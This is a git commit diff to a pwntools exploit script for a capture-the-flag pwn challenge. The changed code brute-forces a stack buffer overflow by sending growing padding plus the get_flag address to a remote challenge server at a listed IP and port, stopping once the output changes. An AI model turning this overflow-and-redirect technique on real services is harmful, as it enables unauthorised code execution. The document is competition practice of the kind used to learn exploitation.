fdd192b78edd31b1f1b918c1c9a6f8bd2f035ff5
memset0 <memset0@outlook.com>
2020-05-03 11:57:44 +0800

    坤坤の舞

--- ctf.ruanx.net/pwn/坤坤の舞/elf.py
+++ ctf.ruanx.net/pwn/坤坤の舞/elf.py
@@ -9,11 +9,20 @@ flag_address = e.symbols['get_flag']
 print(hex(main_address), hex(flag_address))
 print(e.symbols['main'] - e.symbols['get_flag'])
 
-get_flag_address = 0x08400728
+e = ELF('./pwn-1-3-1')
+# get_flag_address = 0x0000000000400728
+get_flag_address = e.symbols['get_flag']
 
-# c = process('./pwn-1-3-1')
-c = remote("47.94.239.235", 4005)
-dat = flat(['a' * 110, p32(get_flag_address)])
-print(dat)
-c.sendline(dat)
-c.interactive()
+for i in range(400):
+	dat = flat(['A' * i, p64(get_flag_address)])
+	print(dat)
+
+	# c = process('./pwn-1-3-1')
+	c = remote("47.94.239.235", 4005)
+	c.recv()
+	c.sendline(dat)
+	res = c.recv().decode()
+	# print(res)
+	if res != '\n':
+		print(i, res)
+		break
